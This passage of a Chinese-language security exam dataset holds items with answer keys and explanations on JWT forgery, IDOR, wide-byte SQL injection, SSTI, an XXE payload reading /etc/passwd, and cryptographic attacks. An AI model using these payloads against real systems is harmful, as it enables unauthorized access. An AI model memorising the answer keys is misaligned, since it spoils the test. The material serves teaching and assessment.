      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：JWT 規範中包含一個特殊的無簽名演算法 `\"alg\": \"none\"`。早期許多存在漏洞的 JWT 驗證函式庫在收到 `\"alg\": \"none\"` 時，若邏輯寫成「若演算法為 none 則直接返回驗證成功」，攻擊者便可將簽名部分（Signature）完全留空，任意竄改 Payload 中的使用者身分（如將 `\"role\": \"user\"` 改為 `\"admin\"`）並通過驗證。\n\n- **干擾項辨析**：\n\n  - (B) 密鑰長度不足會遭受暴力破解，但非 None 演算法漏洞的前提。\n\n  - (C) JWT 結構規定 Payload 必須使用 Base64URL 編碼。\n\n  - (D) 這是密鑰混淆攻擊（Key Confusion Attack），非 None 攻擊。"
    },
    {
      "id": 16,
      "exam": "exam_a",
      "domain": "領域一：Web 應用安全與 OWASP Top 10",
      "category": "Web安全 / JWT 密鑰混淆攻擊",
      "type": "single_choice",
      "question": "當 Web 服務使用非對稱加密（如 RS256，私鑰簽章、公鑰驗證）簽發 JWT，但後端驗證程式庫支援 HMAC（HS256）時，攻擊者若取得伺服器之公開金鑰（Public Key），可透過何種方式偽造管理員 Token？",
      "options": {
        "A": "將 Header 中 `\"alg\"` 改為 `\"HS256\"`，並將伺服器公開金鑰作為對稱密鑰進行 HMAC-SHA256 簽名",
        "B": "直接刪除 Signature 欄位並重送",
        "C": "使用隨機產生的私鑰進行簽章並上傳新公鑰",
        "D": "藉由長度擴展攻擊逆推原始私鑰"
      },
      "answer": "A",
      "basis": "此手法稱為 JWT Key Confusion（密鑰混淆攻擊）。在正常 RS256 下，伺服器使用私鑰簽名、公鑰驗證。然而公鑰通常是公開可得的。若後端驗證程式庫同時支援對稱加密 HS256，且未嚴格強制校驗演算法，攻擊者可將 Header 中的 `\"alg\"` 改為 `\"HS256\"`，並將伺服器的「公開金鑰文字」作為對稱密鑰來計算 HMAC 簽章。伺服器在驗證時讀取同樣的公鑰檔案當作密鑰驗證 HMAC，兩者計算出的簽名完全吻合，成功偽造 Token。",
      "distractor": "- (B) 直接刪除簽章在啟用簽章檢查的伺服器上會被拒絕。\n\n  - (C) 攻擊者上傳自訂公鑰除非伺服器支援 `jku`/`jwk` 且存在任意 URL 載入漏洞。\n\n  - (D) 長度擴展攻擊無法逆推 RSA 私鑰。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：此手法稱為 JWT Key Confusion（密鑰混淆攻擊）。在正常 RS256 下，伺服器使用私鑰簽名、公鑰驗證。然而公鑰通常是公開可得的。若後端驗證程式庫同時支援對稱加密 HS256，且未嚴格強制校驗演算法，攻擊者可將 Header 中的 `\"alg\"` 改為 `\"HS256\"`，並將伺服器的「公開金鑰文字」作為對稱密鑰來計算 HMAC 簽章。伺服器在驗證時讀取同樣的公鑰檔案當作密鑰驗證 HMAC，兩者計算出的簽名完全吻合，成功偽造 Token。\n\n- **干擾項辨析**：\n\n  - (B) 直接刪除簽章在啟用簽章檢查的伺服器上會被拒絕。\n\n  - (C) 攻擊者上傳自訂公鑰除非伺服器支援 `jku`/`jwk` 且存在任意 URL 載入漏洞。\n\n  - (D) 長度擴展攻擊無法逆推 RSA 私鑰。"
    },
    {
      "id": 17,
      "exam": "exam_a",
      "domain": "領域一：Web 應用安全與 OWASP Top 10",
      "category": "Web安全 / 權限控制失效 IDOR",
      "type": "single_choice",
      "question": "使用者 A 登入後可透過 URL `GET /api/documents?doc_id=1024` 下載自己的帳單。若攻擊者修改參數為 `doc_id=1025` 即可直接下載使用者 B 的帳單，此漏洞屬於 OWASP Top 10 中的哪一類別？",
      "options": {
        "A": "A01:2021-Broken Access Control（權限控制失效 / 水平越權）",
        "B": "A02:2021-Cryptographic Failures（加密機制失效）",
        "C": "A03:2021-Injection（注入式攻擊）",
        "D": "A07:2021-Identification and Authentication Failures（認證與識別失效）"
      },
      "answer": "A",
      "basis": "IDOR（Insecure Direct Object References，不安全的直接物件引用）是指系統將資料庫內部物件 ID 直接暴露於前端參數中，且後端未驗證當前登入者是否對該 ID 具備存取權限。攻擊者僅需列舉遞增 ID 即可越權存取他人資源，在 OWASP Top 10 中歸屬於「A01:2021-Broken Access Control（權限控制失效）」。",
      "distractor": "- (B) 加密機制失效是指密碼明文儲存、使用弱金鑰等。\n\n  - (C) 注入式攻擊是指 SQLi、OS Command 等。\n\n  - (D) 認證與識別失效是指密碼撞庫、會話固定等。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：IDOR（Insecure Direct Object References，不安全的直接物件引用）是指系統將資料庫內部物件 ID 直接暴露於前端參數中，且後端未驗證當前登入者是否對該 ID 具備存取權限。攻擊者僅需列舉遞增 ID 即可越權存取他人資源，在 OWASP Top 10 中歸屬於「A01:2021-Broken Access Control（權限控制失效）」。\n\n- **干擾項辨析**：\n\n  - (B) 加密機制失效是指密碼明文儲存、使用弱金鑰等。\n\n  - (C) 注入式攻擊是指 SQLi、OS Command 等。\n\n  - (D) 認證與識別失效是指密碼撞庫、會話固定等。"
    },
    {
      "id": 18,
      "exam": "exam_a",
      "domain": "領域一：Web 應用安全與 OWASP Top 10",
      "category": "Web安全 / 寬字節注入",
      "type": "single_choice",
      "question": "在 PHP 與 MySQL 搭配的環境中，若資料庫連線編碼為 GBK，當後端使用 `addslashes()` 將單引號轉義為 `\\'`（十六進位 `5C 27`）時，攻擊者可輸入以下哪一個位元組序列，使其與 `5C` 結合成合法的雙字節漢字，進而「吃掉」反斜線並使單引號逃逸？",
      "options": {
        "A": "`%00`",
        "B": "`%df`",
        "C": "`%ff`",
        "D": "`%20`"
      },
      "answer": "B",
      "basis": "GBK 是雙字節編碼，其首字節範圍為 `0x81` ~ `0xFE`。當使用 `addslashes()` 轉義單引號 `'`（`0x27`）時，會在前面插入反斜線 `\\`（`0x5C`）。攻擊者輸入 `%df`，在記憶體中形成 `0xDF 0x5C 0x27`。由於 `0xDF 0x5C` 在 GBK 編碼中組合成合法的漢字「運」（`0xDF5C`），反斜線被「吸收吃掉」，導致後續的單引號 `0x27` 成功逃逸閉合 SQL 語句。",
      "distractor": "- (A) `%00` 是空字元截斷，不是寬字節漢字首字節。\n\n  - (C) `%ff` 在某些編碼標準中不是有效首字節。\n\n  - (D) `%20` 是空格，其 ASCII 為 32，小於 128，無法與 5C 組合成雙字節。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：GBK 是雙字節編碼，其首字節範圍為 `0x81` ~ `0xFE`。當使用 `addslashes()` 轉義單引號 `'`（`0x27`）時，會在前面插入反斜線 `\\`（`0x5C`）。攻擊者輸入 `%df`，在記憶體中形成 `0xDF 0x5C 0x27`。由於 `0xDF 0x5C` 在 GBK 編碼中組合成合法的漢字「運」（`0xDF5C`），反斜線被「吸收吃掉」，導致後續的單引號 `0x27` 成功逃逸閉合 SQL 語句。\n\n- **干擾項辨析**：\n\n  - (A) `%00` 是空字元截斷，不是寬字節漢字首字節。\n\n  - (C) `%ff` 在某些編碼標準中不是有效首字節。\n\n  - (D) `%20` 是空格，其 ASCII 為 32，小於 128，無法與 5C 組合成雙字節。"
    },
    {
      "id": 19,
      "exam": "exam_a",
      "domain": "領域一：Web 應用安全與 OWASP Top 10",
      "category": "Web安全 / 伺服器端模板注入 SSTI",
      "type": "single_choice",
      "question": "在基於 Python Flask (Jinja2) 的 Web 應用中，若存在模板注入漏洞，攻擊者在輸入框輸入下列哪一個 Payload 時，最常被用來驗證 SSTI 的存在（回顯計算結果 49）？",
      "options": {
        "A": "`{{7*7}}`",
        "B": "`${7*7}`",
        "C": "`<%= 7*7 %>`",
        "D": "`#{7*7}`"
      },
      "answer": "A",
      "basis": "Python Flask 預設使用 Jinja2 模板引擎。Jinja2 的表達式求值標籤語法為雙大括號 `{{ ... }}`。輸入 `{{7*7}}` 若回顯 `49`，代表伺服器將使用者輸入當作模板語法進行了求值運算，確認存在 SSTI 漏洞。",
      "distractor": "- (B) `${7*7}` 是 Java (JSP EL / Spring EL) 或 PHP / FreeMarker 的常用語法。\n\n  - (C) `<%= 7*7 %>` 是 Ruby (ERB) 或 ASP/JSP 腳本標籤。\n\n  - (D) `#{7*7}` 是 Java JSF / EL 表達式常用語法。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：Python Flask 預設使用 Jinja2 模板引擎。Jinja2 的表達式求值標籤語法為雙大括號 `{{ ... }}`。輸入 `{{7*7}}` 若回顯 `49`，代表伺服器將使用者輸入當作模板語法進行了求值運算，確認存在 SSTI 漏洞。\n\n- **干擾項辨析**：\n\n  - (B) `${7*7}` 是 Java (JSP EL / Spring EL) 或 PHP / FreeMarker 的常用語法。\n\n  - (C) `<%= 7*7 %>` 是 Ruby (ERB) 或 ASP/JSP 腳本標籤。\n\n  - (D) `#{7*7}` 是 Java JSF / EL 表達式常用語法。"
    },
    {
      "id": 20,
      "exam": "exam_a",
      "domain": "領域一：Web 應用安全與 OWASP Top 10",
      "category": "Web安全 / XML外部實體注入 XXE",
      "type": "single_choice",
      "question": "下列哪一段 XML 代碼片段展示了利用 SYSTEM 關鍵字讀取伺服器內部敏感檔案 `/etc/passwd` 的典型 XXE 攻擊宣告？",
      "options": {
        "A": "`<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><user>&xxe;</user>`",
        "B": "`<!ELEMENT test (ANY)><!ENTITY xxe \"/etc/passwd\">`",
        "C": "`<xml><data src=\"/etc/passwd\"/></xml>`",
        "D": "`<!DOCTYPE test [ <!ATTLIST user id CDATA \"/etc/passwd\"> ]>`  \n\n\n\n---\n\n\n\n## 領域二：密碼學與身份驗證機制 (第 21 ~ 35 題)"
      },
      "answer": "A",
      "basis": "標準的 XXE 外部實體宣告採用 `<!DOCTYPE 根標籤 [ <!ENTITY 實體名 SYSTEM \"URI\"> ]>`。其中 `SYSTEM` 關鍵字表示引用外部資源，`file:///etc/passwd` 指定透過本地檔案協議讀取系統密碼檔，隨後在 XML 元素中使用 `&xxe;` 引用實體即可觸發檔案內容讀取。",
      "distractor": "- (B)、(C)、(D) 均不符合 XML DTD 定義外部通用實體的標準語法。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：標準的 XXE 外部實體宣告採用 `<!DOCTYPE 根標籤 [ <!ENTITY 實體名 SYSTEM \"URI\"> ]>`。其中 `SYSTEM` 關鍵字表示引用外部資源，`file:///etc/passwd` 指定透過本地檔案協議讀取系統密碼檔，隨後在 XML 元素中使用 `&xxe;` 引用實體即可觸發檔案內容讀取。\n\n- **干擾項辨析**：\n\n  - (B)、(C)、(D) 均不符合 XML DTD 定義外部通用實體的標準語法。"
    },
    {
      "id": 21,
      "exam": "exam_a",
      "domain": "領域二：密碼學與身份驗證機制",
      "category": "密碼學 / 分組密碼操作模式",
      "type": "single_choice",
      "question": "在進階加密標準（AES）的各類分組密碼模式中，下列哪一種模式**不具備**語意安全性（Semantic Security），相同的明文分組永遠會加密產生相同的密文分組，因而極易洩漏資料分佈模式（如企鵝點陣圖輪廓外洩）？",
      "options": {
        "A": "CBC (Cipher Block Chaining)",
        "B": "ECB (Electronic Codebook)",
        "C": "CFB (Cipher Feedback)",
        "D": "CTR (Counter)"
      },
      "answer": "B",
      "basis": "ECB（Electronic Codebook，電子密碼本模式）是分組密碼最原始的模式。它直接將每個 128 位元的明文分組獨立加密。相同的明文分組永遠產生相同的密文分組，完全無法隱藏資料的統計特性與規律（著名的 Linux 企鵝點陣圖經 ECB 加密後依然清晰可見輪廓）。",
      "distractor": "- (A)、(C)、(D) 均引入了初始化向量（IV）或計數器，具備語意安全性，相同明文多次加密會產生完全不同的密文。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：ECB（Electronic Codebook，電子密碼本模式）是分組密碼最原始的模式。它直接將每個 128 位元的明文分組獨立加密。相同的明文分組永遠產生相同的密文分組，完全無法隱藏資料的統計特性與規律（著名的 Linux 企鵝點陣圖經 ECB 加密後依然清晰可見輪廓）。\n\n- **干擾項辨析**：\n\n  - (A)、(C)、(D) 均引入了初始化向量（IV）或計數器，具備語意安全性，相同明文多次加密會產生完全不同的密文。"
    },
    {
      "id": 22,
      "exam": "exam_a",
      "domain": "領域二：密碼學與身份驗證機制",
      "category": "密碼學 / 填充預言機攻擊",
      "type": "single_choice",
      "question": "Padding Oracle 攻擊針對使用 PKCS#7 / PKCS#5 填充機制的區塊加密（如 AES-CBC）模式。攻擊者發動此攻擊的關鍵依據為何？",
      "options": {
        "A": "伺服器回傳了私鑰的雜湊值",
        "B": "伺服器針對「密文解密後填充無效」與「填充有效但內容錯誤」回傳了不同的錯誤響應或時間延遲",
        "C": "密鑰長度固定為 128 位元",
        "D": "初始化向量（IV）全部填滿為 0"
      },
      "answer": "B",
      "basis": "Padding Oracle（填充預言機）攻擊的根本在於伺服器洩露了「側通道資訊」（Side-channel Information）。解密時伺服器若先校驗 PKCS#7 填充是否合法，填充錯誤回傳 500，填充合法但內容錯誤回傳 200/403，攻擊者便可將伺服器當作 Oracle 預言機，逐字節窮舉解密並還原出整段明文。",
      "distractor": "- (A) 伺服器絕對不會主動回傳私鑰雜湊。\n\n  - (C)、(D) 與是否能構成 Padding Oracle 攻擊無直接因果關係。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：Padding Oracle（填充預言機）攻擊的根本在於伺服器洩露了「側通道資訊」（Side-channel Information）。解密時伺服器若先校驗 PKCS#7 填充是否合法，填充錯誤回傳 500，填充合法但內容錯誤回傳 200/403，攻擊者便可將伺服器當作 Oracle 預言機，逐字節窮舉解密並還原出整段明文。\n\n- **干擾項辨析**：\n\n  - (A) 伺服器絕對不會主動回傳私鑰雜湊。\n\n  - (C)、(D) 與是否能構成 Padding Oracle 攻擊無直接因果關係。"
    },
    {
      "id": 23,
      "exam": "exam_a",
      "domain": "領域二：密碼學與身份驗證機制",
      "category": "密碼學 / 現代認證加密 AEAD",
      "type": "single_choice",
      "question": "在傳輸層安全協議（TLS 1.3）中，強制要求使用具備認證功能的加密模式（AEAD）。下列哪一種 AES 操作模式屬於標準的 AEAD 模式，能夠同時保證資料的機密性與完整性？",
      "options": {
        "A": "AES-ECB",
        "B": "AES-CBC",
        "C": "AES-GCM (Galois/Counter Mode)",
        "D": "AES-OFB"
      },
      "answer": "C",
      "basis": "AEAD（Authenticated Encryption with Associated Data）是現代密碼學的標準。AES-GCM（伽羅瓦/計數器模式）結合了 CTR 模式的高效並行加密與 GHASH 認證標籤，能同時提供機密性、完整性與真實性保證，是 TLS 1.3 強制推薦的加密套件。",
      "distractor": "- (A)、(B)、(D) 均為傳統分組加密模式，無法提供內建的訊息完整性認證（MAC），容易遭受密文延展（Malleability）攻擊或重放攻擊。",
      "full_solution": "- **正確答案**：**(C)**\n\n- **正解依據**：AEAD（Authenticated Encryption with Associated Data）是現代密碼學的標準。AES-GCM（伽羅瓦/計數器模式）結合了 CTR 模式的高效並行加密與 GHASH 認證標籤，能同時提供機密性、完整性與真實性保證，是 TLS 1.3 強制推薦的加密套件。\n\n- **干擾項辨析**：\n\n  - (A)、(B)、(D) 均為傳統分組加密模式，無法提供內建的訊息完整性認證（MAC），容易遭受密文延展（Malleability）攻擊或重放攻擊。"
    },
    {
      "id": 24,
      "exam": "exam_a",
      "domain": "領域二：密碼學與身份驗證機制",
      "category": "密碼學 / RSA 演算法原理",
      "type": "single_choice",
      "question": "在 RSA 公開金鑰密碼系統中，若公鑰為 $(n, e)$，私鑰為 $(n, d)$。已知兩個質數 $p = 61, q = 53$，則歐拉函數 $\\phi(n)$ 的值應為多少？",
      "options": {
        "A": "3233",
        "B": "3120",
        "C": "3174",
        "D": "3286"
      },
      "answer": "B",
      "basis": "RSA 的歐拉函數 $\\phi(n) = (p - 1)(q - 1)$。已知 $p = 61, q = 53$，則 $\\phi(n) = (61 - 1) \\times (53 - 1) = 60 \\times 52 = 3120$。",
      "distractor": "- (A) $n = p \\times q = 61 \\times 53 = 3233$，此為模數 $n$ 而非歐拉函數 $\\phi(n)$。\n\n  - (C)、(D) 均為計算錯誤之干擾項。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：RSA 的歐拉函數 $\\phi(n) = (p - 1)(q - 1)$。已知 $p = 61, q = 53$，則 $\\phi(n) = (61 - 1) \\times (53 - 1) = 60 \\times 52 = 3120$。\n\n- **干擾項辨析**：\n\n  - (A) $n = p \\times q = 61 \\times 53 = 3233$，此為模數 $n$ 而非歐拉函數 $\\phi(n)$。\n\n  - (C)、(D) 均為計算錯誤之干擾項。"
    },
    {
      "id": 25,
      "exam": "exam_a",
      "domain": "領域二：密碼學與身份驗證機制",
      "category": "密碼學 / RSA 攻擊手法",
      "type": "single_choice",
      "question": "若兩個不同的使用者採用了相同的 RSA 模數 $n$，但使用了互質的公鑰指數 $e_1$ 與 $e_2$。當發送方將同一份明文訊息 $m$ 分別用這兩把公鑰加密並傳送時，竊聽者可使用何種數學演算法在已知密文 $c_1, c_2$ 與公鑰的情況下，無需分解 $n$ 即可完全還原明文 $m$？",
      "options": {
        "A": "擴展歐幾里得演算法（共模攻擊 Common Modulus Attack）",
        "B": "費馬小定理分解法",
        "C": "狄利克雷卷積",
        "D": "離散傅立葉變換"
      },
      "answer": "A",
      "basis": "共模攻擊（Common Modulus Attack）：當同一個明文 $m$ 使用相同模數 $n$ 但互質的公鑰 $e_1, e_2$（$\\gcd(e_1, e_2) = 1$）加密時，由貝祖定理存在整數 $r, s$ 使得 $r \\cdot e_1 + s \\cdot e_2 = 1$。竊聽者使用擴展歐幾里得演算法求出 $r, s$，計算 $c_1^r \\cdot c_2^s \\pmod n = (m^{e_1})^r \\cdot (m^{e_2})^s \\pmod n = m^{r e_1 + s e_2} \\pmod n = m^1 = m$，即可直接在未知私鑰情況下還原明文。",
      "distractor": "- (B) 費馬分解適用於 $|p - q|$ 極小的情境。\n\n  - (C)、(D) 不是 RSA 密碼攻擊的數學工具。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：共模攻擊（Common Modulus Attack）：當同一個明文 $m$ 使用相同模數 $n$ 但互質的公鑰 $e_1, e_2$（$\\gcd(e_1, e_2) = 1$）加密時，由貝祖定理存在整數 $r, s$ 使得 $r \\cdot e_1 + s \\cdot e_2 = 1$。竊聽者使用擴展歐幾里得演算法求出 $r, s$，計算 $c_1^r \\cdot c_2^s \\pmod n = (m^{e_1})^r \\cdot (m^{e_2})^s \\pmod n = m^{r e_1 + s e_2} \\pmod n = m^1 = m$，即可直接在未知私鑰情況下還原明文。\n\n- **干擾項辨析**：\n\n  - (B) 費馬分解適用於 $|p - q|$ 極小的情境。\n\n  - (C)、(D) 不是 RSA 密碼攻擊的數學工具。"
    },
    {
      "id": 26,
      "exam": "exam_a",
      "domain": "領域二：密碼學與身份驗證機制",
      "category": "密碼學 / 雜湊函數弱點",
      "type": "single_choice",
      "question": "MD5 與 SHA-1 演算法已被認定為密碼學上不安全，主要原因在於研究者已成功構造出何種攻擊？",
      "options": {
        "A": "逆運算直接從雜湊值還原任意明文（原像攻擊）",
        "B": "碰撞攻擊（Collision Attack，找到兩個不同訊息 $m_1 \\neq m_2$ 使得 $H(m_1) = H(m_2)$）",
        "C": "金鑰窮舉攻擊",
        "D": "側信道能量分析"
      },
      "answer": "B",
      "basis": "MD5 與 SHA-1 被淘汰的核心原因在於其抗碰撞性（Collision Resistance）被突破（如王小雲教授團隊提出的差分碰撞攻擊、Google 的 SHAttered 攻擊已能生成兩份不同內容但 SHA-1 完全相同的 PDF 檔案）。",
      "distractor": "- (A) 雜湊函數具有單向性，目前仍無通用演算法能在多項式時間內對 MD5/SHA-1 實施原像攻擊（逆推任意明文）。\n\n  - (C)、(D) 不是導致標準全面廢棄的核心學術突破。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：MD5 與 SHA-1 被淘汰的核心原因在於其抗碰撞性（Collision Resistance）被突破（如王小雲教授團隊提出的差分碰撞攻擊、Google 的 SHAttered 攻擊已能生成兩份不同內容但 SHA-1 完全相同的 PDF 檔案）。\n\n- **干擾項辨析**：\n\n  - (A) 雜湊函數具有單向性，目前仍無通用演算法能在多項式時間內對 MD5/SHA-1 實施原像攻擊（逆推任意明文）。\n\n  - (C)、(D) 不是導致標準全面廢棄的核心學術突破。"
    },
    {
      "id": 27,
      "exam": "exam_a",
      "domain": "領域二：密碼學與身份驗證機制",
      "category": "密碼學 / 長度擴展攻擊",
      "type": "single_choice",
      "question": "基於 Merkle-Damgård 結構的雜湊函數（如 MD5, SHA-1, SHA-256）在特定實作下容易受到「長度擴展攻擊」（Length Extension Attack）。下列哪一種訊息認證碼構造方式**最容易**受到此攻擊威脅？",
      "options": {
        "A": "$\\text{MAC}(m) = H(\\text{key} \\parallel m)$",
        "B": "$\\text{HMAC}(m) = H((\\text{key} \\oplus \\text{opad}) \\parallel H((\\text{key} \\oplus \\text{ipad}) \\parallel m))$",
        "C": "$\\text{KMAC}(m)$",
        "D": "$\\text{MAC}(m) = H(m \\parallel \\text{key})$"
      },
      "answer": "A",
      "basis": "Merkle-Damgård 結構將輸入分組處理，最後一個分組的輸出直接作為雜湊值。若構造方式為 $\\text{MAC}(m) = H(\\text{key} \\parallel m)$，攻擊者在不知道 key 但知道 $\\text{MAC}(m)$ 與長度的情況下，可將 $\\text{MAC}(m)$ 作為內部狀態，在明文末尾填充 padding 後追加自訂資料 $m'$，計算出合法的 $\\text{MAC}(m \\parallel \\text{padding} \\parallel m')$，此即長度擴展攻擊。",
      "distractor": "- (B) HMAC 採用雙重雜湊結構 $H((\\text{key} \\oplus \\text{opad}) \\parallel H(...))$，徹底免疫長度擴展攻擊。\n\n  - (C) KMAC 基於 Keccak (SHA-3) 的海綿結構，天然免疫長度擴展攻擊。\n\n  - (D) 將 key 放在末尾 $H(m \\parallel \\text{key})$ 雖不受長度擴展影響，但面臨碰撞攻擊風險。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：Merkle-Damgård 結構將輸入分組處理，最後一個分組的輸出直接作為雜湊值。若構造方式為 $\\text{MAC}(m) = H(\\text{key} \\parallel m)$，攻擊者在不知道 key 但知道 $\\text{MAC}(m)$ 與長度的情況下，可將 $\\text{MAC}(m)$ 作為內部狀態，在明文末尾填充 padding 後追加自訂資料 $m'$，計算出合法的 $\\text{MAC}(m \\parallel \\text{padding} \\parallel m')$，此即長度擴展攻擊。\n\n- **干擾項辨析**：\n\n  - (B) HMAC 採用雙重雜湊結構 $H((\\text{key} \\oplus \\text{opad}) \\parallel H(...))$，徹底免疫長度擴展攻擊。\n\n  - (C) KMAC 基於 Keccak (SHA-3) 的海綿結構，天然免疫長度擴展攻擊。\n\n  - (D) 將 key 放在末尾 $H(m \\parallel \\text{key})$ 雖不受長度擴展影響，但面臨碰撞攻擊風險。"
    },
    {
      "id": 28,
      "exam": "exam_a",
      "domain": "領域二：密碼學與身份驗證機制",
      "category": "密碼學 / 密碼儲存安全",
      "type": "single_choice",
      "question": "在儲存使用者密碼雜湊時，若僅使用加鹽（Salt）的 SHA-256（如 `SHA256(password + salt)`），在現代硬體防護下依然容易遭受 GPU/ASIC 暴力破解。為抵抗硬體並行加速攻擊，業界推薦使用何種具備「記憶體硬性」（Memory-Hard）的密碼雜湊演算法？",
      "options": {
        "A": "MD5-Crypt",
        "B": "Argon2",
        "C": "SHA-384",
        "D": "DES-CBC"
      },
      "answer": "B",
      "basis": "Argon2 是 2015 年國際密碼雜湊競賽（Password Hashing Competition, PHC）的獲勝者。它具備記憶體硬性（Memory-Hardness），運算時需要佔用大量記憶體頻寬，使得 ASIC 專用晶片與 GPU 陣列無法藉由大規模並行運算低成本破解，是目前密碼儲存的最佳實踐。",
      "distractor": "- (A) MD5-Crypt 運算量太小，GPU 每秒可嘗試數億次。\n\n  - (C) SHA-384 是普通加密雜湊，專為快速運算設計，非記憶體硬性。\n\n  - (D) DES-CBC 是對稱加密模式，非密碼雜湊算法。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：Argon2 是 2015 年國際密碼雜湊競賽（Password Hashing Competition, PHC）的獲勝者。它具備記憶體硬性（Memory-Hardness），運算時需要佔用大量記憶體頻寬，使得 ASIC 專用晶片與 GPU 陣列無法藉由大規模並行運算低成本破解，是目前密碼儲存的最佳實踐。\n\n- **干擾項辨析**：\n\n  - (A) MD5-Crypt 運算量太小，GPU 每秒可嘗試數億次。\n\n  - (C) SHA-384 是普通加密雜湊，專為快速運算設計，非記憶體硬性。\n\n  - (D) DES-CBC 是對稱加密模式，非密碼雜湊算法。"
    },
    {
      "id": 29,
      "exam": "exam_a",
      "domain": "領域二：密碼學與身份驗證機制",
      "category": "密碼學 / 金鑰交換與前向保密",
      "type": "single_choice",
      "question": "在 SSL/TLS 連線中，若希望即使伺服器的長期私鑰在未來某天洩漏，攻擊者過去錄製的所有歷史通訊流量依然無法被解密，則必須採用具備何種特性的密鑰交換機制？",
      "options": {
        "A": "靜態 RSA 金鑰交換",
        "B": "完全前向保密（Perfect Forward Secrecy, PFS，如 ECDHE）",
        "C": "預共用金鑰（PSK）",
        "D": "固定 Diffie-Hellman (Static DH)"
      },
      "answer": "B",
      "basis": "完全前向保密（PFS）確保了會話金鑰的獨立性。在 ECDHE（短暫橢圓曲線 Diffie-Hellman）中，每次連線雙方都會動態生成一對拋棄式的臨時公私鑰。即使伺服器的長期私鑰在未來被攻破，攻擊者也無法逆推過去會話所使用的臨時金鑰，歷史通訊紀錄依然安全。",
      "distractor": "- (A) 靜態 RSA 金鑰交換中，客戶端使用伺服器公鑰加密 Pre-master secret。一旦伺服器私鑰洩漏，所有歷史流量均可被一次性解密。\n\n  - (C)、(D) 靜態機制均不具備 PFS 特性。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：完全前向保密（PFS）確保了會話金鑰的獨立性。在 ECDHE（短暫橢圓曲線 Diffie-Hellman）中，每次連線雙方都會動態生成一對拋棄式的臨時公私鑰。即使伺服器的長期私鑰在未來被攻破，攻擊者也無法逆推過去會話所使用的臨時金鑰，歷史通訊紀錄依然安全。\n\n- **干擾項辨析**：\n\n  - (A) 靜態 RSA 金鑰交換中，客戶端使用伺服器公鑰加密 Pre-master secret。一旦伺服器私鑰洩漏，所有歷史流量均可被一次性解密。\n\n  - (C)、(D) 靜態機制均不具備 PFS 特性。"
    },
    {
      "id": 30,
      "exam": "exam_a",
      "domain": "領域二：密碼學與身份驗證機制",
      "category": "密碼學 / 數位憑證與 PKI",
      "type": "single_choice",
      "question": "在 X.509 數位憑證驗證鏈結中，客戶端（如瀏覽器）如何驗證網站憑證未被偽造且確由受信任的憑證授權中心（CA）所核發？",
      "options": {
        "A": "使用網站憑證中的公鑰解密該憑證的簽章",
        "B": "使用核發該憑證之 CA 的公開金鑰，解密憑證上的數位簽章，並核對雜湊值是否一致",
        "C": "將整張憑證上傳至 DNS 伺服器進行驗證",
        "D": "檢查憑證的檔案名稱是否包含合法網域名稱"
      },
      "answer": "B",
      "basis": "PKI 數位憑證驗證的核心在於憑證鏈（Certificate Chain）。CA 在核發憑證時，會對該憑證的明文內容進行雜湊，並用 CA 自身的私鑰對雜湊值進行數位簽章。客戶端驗證時，提取本機受信任儲存區內 CA 的公開金鑰，解密該數位簽章取得雜湊值 $H_1$，並自行計算憑證內容雜湊值 $H_2$。若 $H_1 = H_2$，即證明憑證確由該 CA 核發且未被竄改。",
      "distractor": "- (A) 網站自己的公鑰無法用來驗證 CA 的簽章。\n\n  - (C) DNS 不負責驗證 X.509 憑證鏈的數學簽章。\n\n  - (D) 檔名無法提供任何密碼學真實性保證。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：PKI 數位憑證驗證的核心在於憑證鏈（Certificate Chain）。CA 在核發憑證時，會對該憑證的明文內容進行雜湊，並用 CA 自身的私鑰對雜湊值進行數位簽章。客戶端驗證時，提取本機受信任儲存區內 CA 的公開金鑰，解密該數位簽章取得雜湊值 $H_1$，並自行計算憑證內容雜湊值 $H_2$。若 $H_1 = H_2$，即證明憑證確由該 CA 核發且未被竄改。\n\n- **干擾項辨析**：\n\n  - (A) 網站自己的公鑰無法用來驗證 CA 的簽章。\n\n  - (C) DNS 不負責驗證 X.509 憑證鏈的數學簽章。\n\n  - (D) 檔名無法提供任何密碼學真實性保證。"
    },
    {
      "id": 31,
      "exam": "exam_a",
      "domain": "領域二：密碼學與身份驗證機制",
      "category": "密碼學 / 憑證吊銷機制",
      "type": "single_choice",
      "question": "當某網站的 SSL 私鑰洩漏時，管理員需向 CA 申請吊銷憑證。相較於傳統定期下載龐大「憑證吊銷清單」（CRL），現代瀏覽器更常使用何種即時協定查詢單張憑證的吊銷狀態？",
      "options": {
        "A": "SCEP (Simple Certificate Enrollment Protocol)",
        "B": "OCSP (Online Certificate Status Protocol)",
        "C": "ACME (Automated Certificate Management Environment)",
        "D": "LDAP (Lightweight Directory Access Protocol)"
      },
      "answer": "B",
      "basis": "OCSP（Online Certificate Status Protocol，在線憑證狀態協定）允許客戶端向 CA 的 OCSP 伺服器發送即時查詢請求，僅針對特定單張憑證的序號回傳其當前狀態（有效、已吊銷或未知），解決了傳統 CRL 檔案龐大且下載不及時的缺點。",
      "distractor": "- (A) SCEP 用於網路設備向 CA 自動申請註冊憑證。\n\n  - (C) ACME 是自動化申請免費憑證的協定（如 Let's Encrypt）。\n\n  - (D) LDAP 是目錄存取協定。",
